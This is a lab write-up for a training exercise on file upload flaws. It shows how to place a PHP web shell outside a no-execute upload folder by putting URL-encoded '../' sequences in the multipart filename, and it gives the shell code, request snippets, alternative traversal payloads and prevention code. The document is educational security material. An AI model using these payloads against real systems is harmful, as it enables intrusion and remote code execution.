# File Upload Vulnerabilities - Lab #3: Web Shell Upload via Path Traversal

**YouTube Tutorial:** [File Upload Vulnerabilities - Lab #3 Web shell upload via path traversal](https://youtu.be/vgJ3jhBV-7I?si=X0CZ23M3rH0w2-pl)

---

## 1. What is Web Shell Upload via Path Traversal?

### Core Concept

This lab changes the defense entirely. The `/files/avatars/` directory itself has been locked down so it can no longer execute scripts — even if you upload a perfectly valid `shell.php` with no content-type games needed, requesting it back doesn't run the code, it just dumps the raw PHP source as plain text. The execution restriction genuinely works, for files that stay inside that one directory.

The gap is that the *filename* you submit is trusted as-is when the server builds the final file path — and nothing strips out `../` sequences from it. If the server does something conceptually like `save_path = "/files/avatars/" + filename`, then submitting a filename of `../shell.php` makes that concatenation resolve to `/files/shell.php` — one directory up, outside the locked-down avatars folder, and into a directory where script execution is still perfectly normal.

```
┌─────────────────────────────┐        ┌─────────────────────────────┐
│   FILE STAYS IN AVATARS/     │        │   FILE ESCAPES VIA ../       │
├─────────────────────────────┤        ├─────────────────────────────┤
│ Upload shell.php normally    │        │ Upload with filename set     │
│ Stored at:                   │        │ to: ../shell.php             │
│ /files/avatars/shell.php     │        │                               │
└───────────────┬─────────────┘        └───────────────┬─────────────┘
                │                                       │
                ▼                                       ▼
┌─────────────────────────────┐        ┌─────────────────────────────┐
│ Directory has script         │        │ Path resolves to:            │
│ execution DISABLED           │        │ /files/../shell.php          │
│ → visiting the URL just      │        │ = /files/shell.php           │
│ shows raw PHP source text    │        │ (one level UP and OUT)       │
└─────────────────────────────┘        └───────────────┬─────────────┘
                                                         │
                                                         ▼
                                        ┌─────────────────────────────┐
                                        │ /files/ DOES allow script    │
                                        │ execution — visiting THIS    │
                                        │ URL runs the PHP code        │
                                        │ = Remote Code Execution ✅   │
                                        └─────────────────────────────┘
```

The oracle this time is the raw, unsanitized `filename` field in the upload request — a value the client fully controls, that gets stitched directly into a server-side file path with no validation that it can't walk itself right out of the folder it was supposed to be confined to.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability. To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`.

* **Provided Credentials:** `wiener:peter`
* **What Changed From Labs #1 and #2:** Uploading a `.php` file now succeeds cleanly — no Content-Type games needed — but visiting the file's URL just returns the plain PHP source code as text, proving the `/files/avatars/` directory itself no longer executes scripts.
* **Vulnerable Parameter:** The `filename` value submitted as part of the multipart upload request — this is what actually determines the file's final storage path, and it's fully attacker-controlled.
* **End Goal:** Same as the previous labs — get a working PHP web shell somewhere the server *will* execute it, use it to read `/home/carlos/secret`, and submit the contents.

### Root Cause & Impact

The root cause is classic path traversal: user-supplied input (the filename) is concatenated directly into a server-side file path with no sanitization removing `../` sequences, letting the attacker specify a destination outside the intended, restricted directory. The image-upload feature's execution restriction is a genuinely reasonable defense on its own — but it only protects the one directory it was configured for, and a path traversal bug in the filename handling completely sidesteps needing to attack that directory at all.

---

## 3. Attack Methods & Techniques (What I Tried, and What Actually Worked)

**First move — reuse the earlier labs' shell directly.** Logging in as `wiener`, going to "My account," and uploading a straightforward `shell.php` (no Content-Type trickery this time — that's a separate defense that doesn't appear to be present here). The upload succeeds without any error at all.

**Checking whether it actually executes.** Finding the uploaded file's URL — something like `/files/avatars/shell.php` — and visiting it directly. The response comes back, but instead of running the code and printing the secret file's contents, it just shows the raw PHP source: `<?php echo file_get_contents('/home/carlos/secret'); ?>` displayed as plain text. That confirms the file uploaded fine, but this specific directory has been configured to not execute PHP — a real, working restriction, unlike the previous two labs.

**Thinking about where else to put it.** If `/files/avatars/` won't execute scripts, but presumably `/files/` (its parent) might, the question becomes whether there's any way to control *where* inside `/files/` the upload actually lands. Looking at the raw upload request in Burp shows a `filename` parameter sitting right there in the multipart body — this is likely just used directly by the server to build the final save path.

**First attempt at traversal — plain `../`.** Sending the request to Repeater and changing the filename from `shell.php` to `../shell.php`, then sending. The response confirms the upload succeeded, but it explicitly says the file was saved as `avatars/shell.php` — the exact same location as before. The `../` sequence got silently dropped somewhere along the way, as if the server (or some layer in front of it) is stripping literal `../` out of the filename before using it.

**Getting past the stripping — URL-encoding the slash.** If the literal `../` string is being filtered, encoding just the forward slash character (`/` becomes `%2f`) so the filename looks like `..%2fshell.php` might slip past a naive string-based filter while still decoding back to a real `../` by the time the server actually uses the value. Sending this version through Repeater.

**It works.** This time the response confirms the file was saved as `avatars/../shell.php` — meaning the traversal sequence survived all the way through and was applied when building the path. That path, resolved, is just `/files/shell.php` — one directory up and out of the restricted `avatars` folder.

### Server Behavior

* **Uploading `shell.php` normally:** Succeeds, stored in `/files/avatars/`, but visiting the URL only returns raw source text — this directory doesn't execute PHP.
* **Uploading with filename `../shell.php` (literal, unencoded):** Succeeds, but the server's own success message reveals the file was still saved as `avatars/shell.php` — the traversal sequence was stripped or normalized away before being used.
* **Uploading with filename `..%2fshell.php` (URL-encoded slash):** Succeeds, and this time the server's response confirms the file was saved as `avatars/../shell.php` — meaning the encoded slash was decoded back into a real `/` at the point the path was actually used, after any filtering had already happened.
* **Requesting the resulting file at `/files/avatars/../shell.php` (or equivalently, `/files/shell.php`):** The parent `/files/` directory does execute PHP, so this request runs the code and returns the secret file's contents.

---

## 4. Step-by-Step Walkthrough

### Step 1: Confirm the Upload Succeeds But Doesn't Execute

1. Log in with `wiener:peter` and go to **"My account."**
2. Create a file named `shell.php` containing:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

3. Upload it via the avatar field as normal.
4. Find the uploaded file's URL (via Burp's HTTP history or by right-clicking the broken avatar image and opening it in a new tab) — typically `/files/avatars/shell.php`.
5. Visit that URL directly.
6. **Observation:** The response shows the raw PHP source code as plain text, not the executed output — confirming `/files/avatars/` has script execution disabled.

### Step 2: Intercept the Upload Request and Locate the Filename Parameter

1. Turn on Burp Proxy interception, or simply check **Proxy → HTTP history** for the `POST /my-account/avatar` request from Step 1.
2. Send this request to **Burp Repeater**.
3. Locate the `filename` field within the multipart form body:

```http
------WebKitFormBoundary...
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary...
```

### Step 3: Try a Plain Path Traversal Sequence First

1. In Repeater, change `filename="shell.php"` to `filename="../shell.php"`.
2. Send the request.
3. **Observation:** The response confirms a successful upload, but explicitly states the file was saved as `avatars/shell.php` — the same location as before. This tells you the literal `../` sequence is being stripped or normalized out before the path is used.

### Step 4: URL-Encode the Forward Slash to Bypass the Filter

1. Still in Repeater, change the filename value to obfuscate the traversal sequence by URL-encoding just the `/` character. `../shell.php` becomes:

```
..%2fshell.php
```

2. Update the `filename` field to:

```http
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
```

3. Send the request.
4. **Result:** The response now confirms the file was saved as `avatars/../shell.php` — the encoded slash survived whatever filtering caught the literal version in Step 3, and was decoded into a real `/` by the time the path was actually constructed. This confirms the file has been written one directory up, outside the restricted `avatars` folder.

### Step 5: Request the File From Its New Location

1. In your browser, go back to the account page and reload it (this may trigger Burp's HTTP history to show the browser's own attempt to load the now-relocated avatar).
2. In Burp's Proxy history, find the resulting `GET /files/avatars/../shell.php` request, or construct it manually.
3. Send this request (either by revisiting the URL directly in your browser, or via Repeater).
4. **Result:** The response now contains the actual output of the executed PHP code — the contents of `/home/carlos/secret` — confirming that `/files/` (one level above the restricted `avatars` directory) does allow script execution.
5. Note that this same file is also reachable at the simpler, equivalent path `/files/shell.php`, since `/files/avatars/../shell.php` and `/files/shell.php` resolve to the identical location.

### Step 6: Submit the Solution

1. Copy the secret string from the response.
2. Click the lab banner's **"Submit solution"** button, paste the secret, and submit.
3. The lab banner updates to **"Congratulations, you solved the lab!"**.

---

## 5. Different Ways to Exploit This (Alternative Methods & Payloads)

**Double URL-encoding, in case single encoding also gets filtered or decoded too early:**

```
..%252fshell.php
```

Some servers or intermediate layers (proxies, WAFs) decode URL-encoded characters once automatically before the application's own filtering logic runs — if a single `%2f` still gets caught, double-encoding it as `%252f` (which decodes to `%2f` after one pass, then to `/` after a second) can sometimes slip through an extra layer of decoding that the filter doesn't account for.

**Using backslash-based traversal on servers that might be Windows-hosted:**

```
..\shell.php
..%5cshell.php
```

While this lab's backend is Linux-based (so forward slashes are what matters), it's worth knowing that Windows servers also interpret backslashes as path separators — testing both slash directions is standard practice on an unfamiliar target.

**Trying multiple traversal levels, in case a single `../` isn't enough to escape far enough:**

```
../../shell.php
..%2f..%2fshell.php
```

Useful when the upload directory is nested more than one level deep and a single traversal doesn't reach a directory with execution enabled.

**Combining path traversal with the Content-Type bypass from Lab #2**, in case a target has both defenses active simultaneously:

```http
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
Content-Type: image/jpeg
```

Real-world applications often layer multiple weak defenses at once — stacking bypass techniques from earlier labs is a realistic approach when a single technique alone doesn't fully succeed.

**Using Burp Decoder to quickly generate the encoded filename, rather than typing `%2f` by hand:**

1. Open **Burp → Decoder**.
2. Type or paste `../shell.php` into the input field.
3. Select **Encode as → URL**, but only apply it to the `/` character rather than the whole string, or manually construct the value by encoding just that one character, since over-encoding the rest of the filename unnecessarily could trigger other, unrelated validation issues.

**A quick manual test to confirm whether ANY traversal filtering is present at all, before committing to the encoding bypass**, try a filename like `test/../shell.php` or `randomfolder/shell.php` first — as some write-ups note, testing a nonsense prefix before a slash (e.g. `afaf/shell.php`) can reveal that the server strips everything before the last `/` and only keeps the final filename segment, which is useful diagnostic information even when it doesn't directly solve the lab.

---

## 6. If This Existed in the Real World

Path traversal in file upload filename handling is one of the most consistently found vulnerability classes in real penetration tests and bug bounty reports, precisely because so many upload implementations build file paths via simple string concatenation:

* **CVE-listed vulnerabilities in file-sharing and CMS platforms:** Numerous real products — document management systems, forum attachment handlers, CMS media libraries — have shipped with exactly this flaw: an upload endpoint that accepts a client-supplied filename and uses it directly in a server-side path, letting attackers write files outside the intended upload directory, sometimes even overwriting existing application files entirely (a more severe variant than just placing a new file).
* **Zip-slip vulnerabilities**, a well-known related pattern, apply the same path traversal idea to archive extraction rather than direct uploads — a malicious ZIP file containing entries named with `../` sequences can cause extracted files to land outside the intended extraction directory, and this exact bug class has affected extraction libraries used by a huge number of real-world Java, Node.js, and Go applications.
* **Profile picture and document upload features in real SaaS products** have been reported via bug bounty programs allowing attackers to traverse out of an intended `uploads/user-{id}/` style directory into shared or system directories, in some cases achieving remote code execution exactly like this lab when the destination directory happened to allow script execution.

---

## 7. Pro-Tips & Common Pitfalls

* **When a straightforward traversal attempt gets silently normalized, don't give up — check exactly what came back.** The server's own success message in Step 3 (confirming the file landed at `avatars/shell.php`, not one level up) is the clue that tells you filtering is happening — many people miss this and assume the whole technique doesn't apply here, when actually it just needs an encoding tweak.
* **URL-encoding a single character is often enough — you don't need to encode the whole string.** Over-encoding unrelated parts of the filename can sometimes trigger unrelated issues or make the request harder to read and debug; encode only the character(s) actually being filtered.
* **Always re-verify success by checking what path the server reports back, not just whether the HTTP status was 200.** A "successful" upload can still land in the wrong (safe) location if your traversal payload got stripped — the confirmation message revealing the actual stored path (as seen in this lab) is far more reliable than the status code alone.
* **This lab's core lesson generalizes well beyond file uploads:** any feature that builds a file path, URL, or system command by directly concatenating user input — export filenames, log file names, backup naming, template includes — is worth testing for the exact same traversal-plus-encoding technique.
* **The vulnerable backend pattern:**

```php
// ❌ VULNERABLE — filename is used directly to build the save path,
// with no sanitization removing directory traversal sequences
$filename = $_FILES['avatar']['name']; // fully attacker-controlled
$savePath = "/var/www/files/avatars/" . $filename; // "../shell.php" escapes this directory
move_uploaded_file($_FILES['avatar']['tmp_name'], $savePath);

// ✅ SAFE — strip any path information from the filename entirely,
// and generate a new, safe filename server-side regardless of input
$safeFilename = generateRandomFilename() . '.jpg'; // never derived from user input at all
$savePath = "/var/www/files/avatars/" . $safeFilename;
move_uploaded_file($_FILES['avatar']['tmp_name'], $savePath);
```

* **Prevention summary:**
  * Never use a client-supplied filename directly (or as part of) a server-side file path — strip it down to just a basename with `basename()`-equivalent logic, or better, ignore it entirely and generate a new filename server-side.
  * If any filtering for traversal sequences is applied, apply it *after* full URL-decoding of the input, not before — filtering on the raw, still-encoded value is exactly what allowed this lab's bypass to work.
  * Defense-in-depth matters: even with execution correctly disabled in the intended upload directory, a path traversal bug can move the file somewhere that restriction doesn't cover — disable script execution as broadly as possible across any directory reachable via user uploads, not just the primary one.
  * Run upload-handling code with the minimum possible filesystem permissions, so that even a successful traversal has a limited set of directories it could actually write to.